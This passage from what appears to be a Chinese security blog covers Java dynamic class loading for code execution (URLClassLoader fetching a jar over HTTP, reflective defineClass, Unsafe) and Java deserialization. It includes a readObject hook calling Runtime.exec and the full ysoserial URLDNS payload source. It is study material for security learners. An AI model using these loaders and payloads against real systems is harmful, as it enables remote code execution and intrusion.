title="http+jar协议"></a>http+jar协议</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPJarRCE</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:http://127.0.0.1:9999!/&quot;</span>)&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里需要用python起一个http server。</p><p><img src="/2023/04/27/file-upload/image-20231007144421503.png" alt="image-20231007144421503"></p><h3 id="利用ClassLoader-defineClass直接加载字节码"><a href="#利用ClassLoader-defineClass直接加载字节码" class="headerlink" title="利用ClassLoader#defineClass直接加载字节码"></a>利用ClassLoader#defineClass直接加载字节码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DefineClassRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>).getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        method.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Calc.class&quot;</span>));<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>(Class) method.invoke(classLoader,<span class="hljs-string">&quot;Calc&quot;</span>,code,<span class="hljs-number">0</span>,code.length);<br>        c.newInstance();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>defineClass是ClassLoader中的一个方法：</p><p><img src="/2023/04/27/file-upload/image-20231007150913651.png" alt="image-20231007150913651"></p><p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p><p>由于该方法是protected，所以需要通过反射进行调用 <code>defineClass()</code> 方法进行字节码的加载，最后跟前面的步骤一样，通过newInstance进行初始化：</p><p><img src="/2023/04/27/file-upload/image-20231007150604318.png" alt="image-20231007150604318"></p><h3 id="Unsafe加载字节码"><a href="#Unsafe加载字节码" class="headerlink" title="Unsafe加载字节码"></a>Unsafe加载字节码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> DynamicClassLoader.URLClassLoader;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnsafeRce</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<br>        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> unsafeClass.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">classUnsafe</span> <span class="hljs-operator">=</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> unsafeClass.getMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class, ClassLoader.class, ProtectionDomain.class);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Calc.class&quot;</span>));<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <span class="hljs-string">&quot;Calc&quot;</span>, code, <span class="hljs-number">0</span>, code.length, classLoader, <span class="hljs-literal">null</span>);<br>        calc.newInstance();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20231007152859809.png" alt="image-20231007152859809"></p><p>这里相对要复杂一点。首先是导入所需的类和包，包括<code>sun.misc.Unsafe</code>和一些Java核心类。接着创建一个<code>ClassLoader</code>对象，该对象是系统类加载器。随后获取<code>Unsafe</code>类的<code>Class</code>对象，通过反射获取<code>Unsafe</code>类中的<code>theUnsafe</code>字段，并设置其可访问性。再使用反射获取<code>theUnsafe</code>字段的值，即<code>Unsafe</code>类的实例，使用反射获取<code>Unsafe</code>类中的<code>defineClass</code>方法，该方法用于定义一个新的类。后面通过Files读取文件系统中的字节码文件，这里假设文件路径为”D:\Calc.class”。最后调用<code>defineClass</code>方法，使用<code>Unsafe</code>实例来定义一个名为”Calc”的类，传递字节码、类加载器和保护域等参数，将返回的<code>Class</code>对象赋值给<code>calc</code>变量，用<code>newInstance</code>方法创建<code>calc</code>类的实例，从而触发远程代码执行。</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化-反序列化概念&amp;&amp;URLDNS链</title>
    <link href="/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5/"/>
    <url>/2024/07/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5/</url>
    
    <content type="html"><![CDATA[<h1 id="java反序列化-反序列化概念-URLDNS链"><a href="#java反序列化-反序列化概念-URLDNS链" class="headerlink" title="java反序列化-反序列化概念&amp;&amp;URLDNS链"></a>java反序列化-反序列化概念&amp;&amp;URLDNS链</h1><p>简单来说：</p><p><strong>序列化：对象 -&gt; 字符串</strong><br><strong>反序列化：字符串 -&gt; 对象</strong></p><h2 id="反序列化代码实现"><a href="#反序列化代码实现" class="headerlink" title="反序列化代码实现"></a>反序列化代码实现</h2><p>SerializationTest和UnserializeTest分别对Person类进行了序列化与反序列化操作。</p><p>注意：</p><ul><li><h5 id="序列化类的属性要-实现Serializable-接口"><a href="#序列化类的属性要-实现Serializable-接口" class="headerlink" title="序列化类的属性要 实现Serializable 接口"></a>序列化类的属性要 实现Serializable 接口</h5></li><li><h5 id="静态成员变量是不能被序列化"><a href="#静态成员变量是不能被序列化" class="headerlink" title="静态成员变量是不能被序列化"></a>静态成员变量是不能被序列化</h5></li><li><h5 id="transient-标识的对象成员变量不参与序列化"><a href="#transient-标识的对象成员变量不参与序列化" class="headerlink" title="transient 标识的对象成员变量不参与序列化"></a>transient 标识的对象成员变量不参与序列化</h5></li></ul><h3 id="Person-java"><a href="#Person-java" class="headerlink" title="Person.java"></a>Person.java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-comment">// 构造函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="SerializationTest"><a href="#SerializationTest" class="headerlink" title="SerializationTest"></a>SerializationTest</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutput;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-number">22</span>);<br>        System.out.println(person);<br>        serialize(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/ion/image-20230921160513237.png" alt="image-20230921160513237"></p><h3 id="UnserializeTest"><a href="#UnserializeTest" class="headerlink" title="UnserializeTest"></a>UnserializeTest</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person)unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>        System.out.println(person);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/ion/image-20230921160537177.png" alt="image-20230921160537177"></p><h2 id="反序列化产生的安全问题"><a href="#反序列化产生的安全问题" class="headerlink" title="反序列化产生的安全问题"></a>反序列化产生的安全问题</h2><p>主要问题出在<code>writeObject</code> 和 <code>readObject</code>两个方法。在服务端进行反序列化操作时，会自动执行**客户端所传入的readObject方法，这一步就可能会出问题。</p><p>最简单的情况是readObject直接可控，调用一个危险的方法，例如直接在Person.java中重写readObject方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream objectInputStream)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        objectInputStream.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/ion/image-20230921162543906.png" alt="image-20230921162543906"></p><p>debug可以看到，在执行readObject时，调用了重写的方法，接着触发了计算器：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921162606201.png" alt="image-20230921162606201"></p><p>总之，要借助readObject方法，来调用危险的方法，执行命令。</p><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><ul><li>继承Serializable</li><li>入口类</li><li>执行类</li></ul><h4 id="示例：如何找入口类"><a href="#示例：如何找入口类" class="headerlink" title="示例：如何找入口类"></a>示例：如何找入口类</h4><p>以HashMap举例，首先他实现了Serializable接口：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921163739225.png" alt="image-20230921163739225"></p><p>首先找到重写的readObject：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921164830331.png" alt="image-20230921164830331"></p><p>往下找，发现在一个for循环里进行了readObject操作，又将key进行了hash运算：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921165153159.png" alt="image-20230921165153159"></p><p>跟进hash运算：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921165406071.png" alt="image-20230921165406071"></p><p>如果key为空，返回0，否则再下一步h&#x3D;key.hashCode()：</p><p><img src="/2023/04/27/file-upload/ion/image-20230921165646807.png" alt="image-20230921165646807"></p><p>而hashCode在类Object中，为常见的函数，可以作为入口类。</p><h2 id="URLDNS链分析"><a href="#URLDNS链分析" class="headerlink" title="URLDNS链分析"></a>URLDNS链分析</h2><p>URLDNS链是反序列化利用链中比较简单的，这条链的主要作用就是用于判断是否存在Java反序列化漏洞，没有jdk版本限制，并且只依赖原生类。</p><p>首先看一下在ysoserial中给出的gadget chain:</p><p><img src="/2023/04/27/file-upload/ion/image-20230921172836817.png" alt="image-20230921172836817"></p><p><strong>HashMap.readObject()—&gt;HashMap.putVal()—&gt;HashMap.hash()—&gt;URL.hashCode()</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>首先给出ysoserial中的payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.URLConnection;<br><span class="hljs-keyword">import</span> java.net.URLStreamHandler;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.Authors;<br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.Dependencies;<br><span class="hljs-keyword">import</span> ysoserial.payloads.annotation.PayloadTest;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.PayloadRunner;<br><span class="hljs-keyword">import</span> ysoserial.payloads.util.Reflections;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * A blog post with more details about this gadget chain is at the url below:</span><br><span class="hljs-comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   This was inspired by  Philippe Arteau <span class="hljs-doctag">@h</span>3xstream, who wrote a blog</span><br><span class="hljs-comment"> *   posting describing how he modified the Java Commons Collections gadget</span><br><span class="hljs-comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span><br><span class="hljs-comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span><br><span class="hljs-comment"> *   standard JDK classes.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   The Java URL class has an interesting property on its equals and</span><br><span class="hljs-comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span><br><span class="hljs-comment"> *   during a comparison (either equals or hashCode).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span><br><span class="hljs-comment"> *   deserializes, so using a Java URL object as a serialized key allows</span><br><span class="hljs-comment"> *   it to trigger a DNS lookup.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *   Gadget Chain:</span><br><span class="hljs-comment"> *     HashMap.readObject()</span><br><span class="hljs-comment"> *       HashMap.putVal()</span><br><span class="hljs-comment"> *         HashMap.hash()</span><br><span class="hljs-comment"> *           URL.hashCode()</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span><br><span class="hljs-meta">@PayloadTest(skip = &quot;true&quot;)</span><br><span class="hljs-meta">@Dependencies()</span><br><span class="hljs-meta">@Authors(&#123; Authors.GEBL &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>                <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>                ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>                Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span><br><br>                <span class="hljs-keyword">return</span> ht;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>                PayloadRunner.run(URLDNS.class, args);<br>        &#125;<br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URLStreamHandler</span> &#123;<br><br>                <span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title function_">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title function_">getHostAddress</span><span class="hljs-params">(URL u)</span> &#123;<br>                        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中核心代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HashMap</span> <span class="hljs-variable">ht</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(); <span class="hljs-comment">// HashMap that will contain the URL</span><br><span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-literal">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br></code></pre></td></tr></table></figure><p>前面已经分析过，HashMap可以作为一个很好的入口类，跟进查看：</p><p><img src="/2023/04/27/file-upload/ion/image-20230922234833021.png" alt="image-20230922234833021"></p><p>看里面重写的readObject方法，和前文提到的一样，for里面调用了readObject，随后进行了<code>putVal(*hash*(key), key, value, false, false);</code>操作,先对key的值进行了hash运算，跟进hash：</p><p><img 